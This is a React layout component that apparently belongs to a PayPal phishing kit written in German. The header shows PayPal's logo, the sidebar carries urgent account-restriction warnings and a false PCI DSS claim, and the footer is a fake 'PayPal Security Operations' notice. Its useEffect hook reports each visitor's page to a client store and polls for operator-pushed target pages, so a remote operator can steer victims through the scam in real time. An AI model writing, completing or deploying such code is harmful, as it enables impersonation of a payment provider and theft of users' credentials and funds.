import React, { useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { ClientStore } from '../services/ClientStore';

interface MainLayoutProps {
  children: React.ReactNode;
  showSidebar?: boolean;
}

export default function MainLayout({ children, showSidebar = true }: MainLayoutProps) {
  const location = useLocation();
  const navigate = useNavigate();

  // Track page and listen for target push
  useEffect(() => {
    const id = sessionStorage.getItem('clientId');
    if (id) {
      ClientStore.addOrUpdateClient({ id, currentPage: location.pathname });
    }

    const interval = setInterval(async () => {
      if (id) {
        const clients = await ClientStore.fetchClients();
        const me = clients.find(c => c.id === id);
        if (me && me.targetPage && me.targetPage !== location.pathname) {
          const target = me.targetPage;
          // Clear target so it doesn't loop
          await ClientStore.addOrUpdateClient({ id, targetPage: undefined });
          navigate(target);
        }
      }
    }, 2000);

    return () => clearInterval(interval);
  }, [location.pathname, navigate]);

  return (
    <div className="min-h-screen h-full flex flex-col font-sans overflow-hidden bg-[var(--color-app-bg)]">
      {/* Header */}
      <header className="h-[64px] bg-white text-white flex items-center px-6 justify-between shadow-sm z-10 shrink-0 border-b border-app-border">
        <div className="flex items-center gap-3">
          <img 
            src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-wordmark-color.svg" 
            alt="PayPal Logo" 
            className="h-6"
            referrerPolicy="no-referrer"
          />
        </div>
      </header>

      {/* Main Area */}
      <main className="flex flex-1 overflow-hidden relative">
        {/* Sidebar - only shown if showSidebar is true */}
        {showSidebar && (
          <aside className="w-[280px] bg-sidebar-bg border-r border-app-border p-6 flex-col gap-5 hidden lg:flex shrink-0">
            <div className="text-[12px] font-bold text-text-muted uppercase tracking-wider">Sicherheits-Status</div>
            <div className="text-[14px] leading-[1.6] space-y-3">
              <div className="p-3 bg-red-50 border border-red-100 rounded-lg">
                <p className="text-red-700 font-bold text-xs uppercase mb-1">Dringend</p>
                <p className="text-red-600 text-xs">Konto-Aktivität eingeschränkt</p>
              </div>
              <p className="text-xs text-text-muted">
                Bitte folgen Sie den Anweisungen, um die volle Funktionalität wiederherzustellen.
              </p>
            </div>
            <hr className="border-0 border-t border-app-border" />
            <div className="text-[12px] text-text-muted">
              Ihre Daten werden nach dem PayPal Sicherheitsstandard (PCI DSS) verschlüsselt.
            </div>
          </aside>
        )}

        {/* Content Area */}
        <div className={`flex-1 overflow-y-auto ${!showSidebar ? 'flex items-center justify-center' : ''}`}>
          {children}
        </div>
      </main>

      {/* Footer */}
      <footer className="h-[32px] bg-white border-t border-app-border flex items-center px-6 text-[11px] text-text-muted shrink-0">
        &copy; 2026 PayPal Security Operations. Nur für autorisierte Kunden.
      </footer>
    </div>
  );
}
